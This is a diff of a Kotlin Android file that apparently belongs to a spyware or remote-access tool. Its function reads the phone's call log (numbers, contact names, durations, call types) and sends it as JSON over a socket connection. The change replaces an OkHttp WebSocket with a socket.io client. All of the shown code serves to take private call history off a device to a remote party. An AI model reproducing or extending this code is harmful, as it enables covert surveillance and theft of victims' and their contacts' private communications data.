@@ -1,19 +1,12 @@
 package com.example.betryalcommit
 import android.content.ContentResolver
 import android.database.Cursor
-import android.os.Handler
-import android.os.Looper
 import android.provider.CallLog
-import okhttp3.WebSocket
+import io.socket.client.Socket
 import org.json.JSONObject
-import java.io.BufferedWriter
-import java.io.File
-import java.io.FileOutputStream
-import java.io.IOException
-import java.io.OutputStreamWriter
 
-    object callutil {
-        fun uploadCalls(contentResolver: ContentResolver,webSocket: WebSocket) {
+object callutil {
+        fun uploadCalls(contentResolver: ContentResolver, webSocket: Socket) {
             val numberCol = CallLog.Calls.NUMBER
             val durationCol = CallLog.Calls.DURATION
             val contactCol = CallLog.Calls.CACHED_NAME
@@ -36,8 +29,8 @@ import java.io.OutputStreamWriter
                 text += "Contact:$contactName\nnumber : $number\nduration : $duration\nType : $typeCorrect\n\n" }
             cursor?.close()
            val jsontext = JSONObject()
-            jsontext.put("type","call_log")
+            jsontext.put("type","call_logs")
             jsontext.put("data",text);
-            webSocket.send(jsontext.toString())
+            webSocket.emit("response",jsontext.toString())
         }
     }
